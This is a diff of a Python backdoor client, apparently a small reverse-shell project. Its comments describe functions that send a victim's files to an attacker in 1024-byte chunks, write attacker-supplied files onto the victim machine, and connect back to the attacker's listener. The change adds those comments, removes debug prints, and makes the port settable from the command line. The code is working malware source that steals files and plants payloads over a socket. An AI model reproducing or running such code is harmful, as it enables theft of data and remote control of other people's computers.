@@ -2,8 +2,11 @@ from socket import socket, AF_INET, SOCK_STREAM
 from platform import platform
 import subprocess
 from time import sleep
+from sys import argv
 
 
+# opens a file and sends it to attacker 
+# in chunks of 1024 bytes
 def steal(sock, path):
 	path = path.split(" ")[0]
 	try:
@@ -15,31 +18,23 @@ def steal(sock, path):
 		file.close()
 		sleep(0.2)
 		sock.send("end".encode())
-
 	except:
 		pass
 
+# receives a file form attacker and
+# places it on the victims machine
 def place(sock, path):
 	path = path.split(" ")[1]
 	end = "end".encode()
-
 	file = open(path, "wb")
 
-	print("made", path)
-
 	f = sock.recv(1024)
-	print(f)
-	
-	while f != end:
-		
+	while f != end:	
 		file.write(f)
 		f = sock.recv(1024)
 
 	file.close()	
 	
-	
-
-
 
 # connects to the attacker
 # returns a socket
@@ -48,10 +43,10 @@ def connect(host, port):
 	sock.connect((host, port))
 	return sock
 
+
 # parses the received command
 # returns two values: the action to be done
 # and the parameter
-
 def parseCommand(raw):
 	command = raw.split(" ")
 	action = command[0]
@@ -63,7 +58,14 @@ def parseCommand(raw):
 def main():
 
 	host = "localhost"
-	port = 5500
+	
+	if len(argv) > 1:
+		try:
+			port = int(argv[1])
+		except:
+			port = 5500
+	else:
+		port = 5500
 
 	info = ("System: " + platform()).encode()
 	sock = connect(host, port)
